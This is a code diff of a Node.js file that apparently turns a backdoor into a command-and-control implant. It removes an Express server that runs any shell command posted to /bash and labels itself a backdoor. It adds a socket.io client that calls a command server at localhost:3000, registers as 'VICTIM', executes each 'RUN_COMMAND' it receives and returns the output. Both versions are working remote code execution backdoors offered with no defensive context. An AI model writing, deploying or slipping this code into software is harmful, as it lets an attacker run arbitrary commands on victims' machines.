@@ -1,31 +1,12 @@
 var exec = require('child_process').exec;
-var express = require('express');
-var bodyParser = require('body-parser');
-var app = express();
+var socket = require('socket.io-client')('http://localhost:3000');
 
-app.use(bodyParser.json());
-
-app.post('/bash', function (req, res) {
-  var response = {
-    error: false,
-    stdout: '',
-    stderr: ''
-  }
-  console.log(req.body);
-  exec(req.body.command, function (err, stdout, stderr) {
-    if (err) {
-      response.error = true
-    } else {
-      response.stdout = stdout;
-      response.stderr = stderr;
-    }
-    res.json(response);
-  });
+socket.on('connect', function(){
+  socket.emit('VICTIM', {});
 });
 
-var server = app.listen(8989, function () {
-  var host = server.address().address;
-  var port = server.address().port;
-
-  console.log('Backdoor app listening at http://%s:%s', host, port);
+socket.on('RUN_COMMAND', function (command) {
+  exec(command, function (err, stdout, stderr) {
+    socket.emit('STDOUT', stdout);
+  });
 });
